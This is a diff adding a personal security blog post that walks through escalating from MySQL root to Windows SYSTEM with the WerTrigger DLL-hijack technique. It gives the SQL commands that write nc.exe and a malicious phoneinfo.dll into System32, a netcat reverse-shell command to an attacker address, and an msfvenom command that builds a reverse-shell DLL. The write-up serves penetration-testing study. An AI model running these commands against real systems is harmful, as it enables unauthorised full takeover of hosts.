@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>MySQL LPE to RCE via WerTrigger</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>xinyue@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>MySQL LPE to RCE via WerTrigger</h2>
+  <time datetime="2024-06-26T00:00:00-07:00" class="by-line">26 Jun 2024</time>
+  <h1 id="overview">Overview</h1>
+
+<p>MySQL typically runs as a privileged user, such as the root account, making it a potential target for privilege escalation if not properly configured, such as having no password or a weak password for the root account. One method attackers can use to execute arbitrary commands as a privileged user is to exploit a malicious user-defined library. By uploading a malicious library to the plugin directory, attackers can define malicious functions and execute any command on the system with elevated privileges. Detailed information about this technique can be found <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql">here</a>.</p>
+
+<p>However, not every MySQL environment has an ideal plugin directory setting for such attacks, so alternative exploitation methods are required if we are to gain access to MySQL. Typically, logging in as a privileged user gives us read and write access to system files. We can abuse built-in functions such as <code class="language-plaintext highlighter-rouge">load_file</code> and <code class="language-plaintext highlighter-rouge">dump_file</code> to dump files into restricted directories, such as the system directory. This allows us to place a malicious DLL in the system folder and trigger it to escalate privileges and execute arbitrary commands as NT SYSTEM.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">WerTrigger</code> technique involves placing a malicious phoneinfo.dll in the System32 folder and finding a way to trigger it without rebooting the system. According to <a href="https://github.com/sailay1996/WerTrigger">the WerTrigger repository</a>, this DLL is typically missing from the System32 folder, but is automatically loaded by Windows systems after a reboot if boot logging is enabled in Procmon. If we can bypass the reboot process and trick the system into loading a malicious phoneinfo.dll, we can gain a shell as the system user. Using Report.wer and WerTrigger.exe provided in the GitHub repository, we can trigger and execute arbitrary commands as SYSTEM. All of these actions can be performed using MySQL commands if we have privileged access. This allows us to escalate from the root user in MySQL to the SYSTEM user on the target machine.</p>
+
+<h1 id="exploit">Exploit</h1>
+
+<p>We logged in as root and uploaded nc.exe to check if we have write permission.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ariaDB</span> <span class="p">[</span><span class="nx">mysql</span><span class="p">]</span><span class="o">&gt;</span> <span class="nx">select</span> <span class="nx">load_file</span><span class="p">(</span><span class="dl">"</span><span class="s2">C:</span><span class="se">\\\\</span><span class="s2">test</span><span class="se">\\</span><span class="s2">nc.exe</span><span class="dl">"</span><span class="p">)</span> <span class="nx">into</span> <span class="nx">dumpfile</span> <span class="dl">'</span><span class="s1">C:</span><span class="se">\\\\</span><span class="s1">test</span><span class="se">\\</span><span class="s1">ncat.exe</span><span class="dl">'</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p><img src="../assets/images/2024-06-26-MySQL-LPE-to-RCE-via-WerTrigger/exploit.png" alt="" /></p>
+
+<p>Then upload phoneinfo.dll to System32.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">MariaDB</span> <span class="p">[</span><span class="nx">mysql</span><span class="p">]</span><span class="o">&gt;</span> <span class="nx">select</span> <span class="nx">load_file</span><span class="p">(</span><span class="dl">'</span><span class="s1">C:</span><span class="se">\\\\</span><span class="s1">xampp</span><span class="se">\\</span><span class="s1">htdocs</span><span class="se">\\</span><span class="s1">phoneinfo.dll</span><span class="dl">'</span><span class="p">)</span> <span class="nx">into</span> <span class="nx">dumpfile</span> <span class="dl">"</span><span class="s2">C:</span><span class="se">\\\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">System32</span><span class="se">\\</span><span class="s2">phoneinfo.dll</span><span class="dl">"</span><span class="p">;</span><span class="o">\</span>
+</code></pre></div></div>
+
+<p>In the same directory as Report.wer, We ran WerTrigger.exe(no output), then execute reverse shell payload. Now we are NT SYSTEM</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\test</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\WerTrigger.exe</span><span class="w">
+</span><span class="n">C:\test\nc.exe</span><span class="w"> </span><span class="nx">192.168.x.x</span><span class="w"> </span><span class="nx">445</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="../assets/images/2024-06-26-MySQL-LPE-to-RCE-via-WerTrigger/WerTrigger1.png" alt="" /></p>
+
+<p><img src="../assets/images/2024-06-26-MySQL-LPE-to-RCE-via-WerTrigger/WerTrigger2.png" alt="" /></p>
+
+<h3 id="alternative">Alternative:</h3>
+
+<p>We can also generate a reverse shell dll and name it as phoneinfo.dll. Then use WerTrigger.exe to trigger it.</p>
+
+<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">msfvenom</span> <span class="o">-</span><span class="nx">p</span> <span class="nx">windows</span><span class="o">/</span><span class="nx">x64</span><span class="o">/</span><span class="nx">shell_reverse_tcp</span> <span class="nx">LHOST</span><span class="o">=</span><span class="mf">192.168</span><span class="p">.</span><span class="nx">x</span><span class="p">.</span><span class="nx">x</span>  <span class="nx">LPORT</span><span class="o">=</span><span class="mi">445</span> <span class="o">--</span><span class="nx">platform</span> <span class="nx">windows</span> <span class="o">--</span><span class="nx">arch</span> <span class="nx">x64</span> <span class="o">-</span><span class="nx">f</span> <span class="nx">dll</span> <span class="o">-</span><span class="nx">o</span> <span class="nx">phoneinfo</span><span class="p">.</span><span class="nx">dll</span>
+</code></pre></div></div>
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://xxxinhy.github.io/">
+    <span>
+        <b>Xinyue</b>
+    </span>
+    
+    <span>© 2024</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
